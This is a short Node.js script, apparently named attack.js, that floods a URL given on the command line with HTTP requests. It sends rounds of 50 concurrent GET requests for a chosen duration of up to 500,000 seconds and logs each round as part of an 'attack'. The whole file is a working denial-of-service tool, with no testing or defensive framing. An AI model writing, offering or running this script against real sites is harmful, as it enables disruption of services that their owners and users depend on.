const axios = require('axios');
const async = require('async');

const target = process.argv[2]; // Target URL (passed as command line argument)
const duration = parseInt(process.argv[3]); // Duration in seconds (passed as command line argument)
const maxRequests = 50; // Max simultaneous requests per round

if (!target || isNaN(duration) || duration <= 0 || duration > 500000) {
    console.error('Usage: node attack.js <target_url> <duration_in_seconds>');
    process.exit(1);
}

console.log(`Attacking target: ${target} for ${duration} seconds...`);

// Function to send a single request
const sendRequest = async () => {
    try {
        const response = await axios.get(target, {timeout: 25000}); // Wait for max 25 seconds for a response
        console.log(`Response received from ${target}: ${response.status}`);
    } catch (error) {
        console.error(`Error accessing ${target}: ${error.message}`);
    }
};

// Function to send multiple requests at once and wait for all responses
const sendMultipleRequests = async () => {
    const tasks = [];

    // Add 'maxRequests' tasks (requests) to the array
    for (let i = 0; i < maxRequests; i++) {
        tasks.push(sendRequest);
    }

    // Use async to send all requests concurrently
    await async.parallel(tasks);
};

// Function to continuously send requests for the specified duration
const startAttack = async () => {
    const endTime = Date.now() + duration * 1000; // Convert duration to milliseconds

    // Keep sending requests until the duration expires
    while (Date.now() < endTime) {
        console.log(`Sending ${maxRequests} requests...`);
        await sendMultipleRequests(); // Send requests and wait for all responses
        console.log(`Completed round of ${maxRequests} requests.`);
    }

    console.log('Attack completed!');
};

// Start the attack
startAttack();
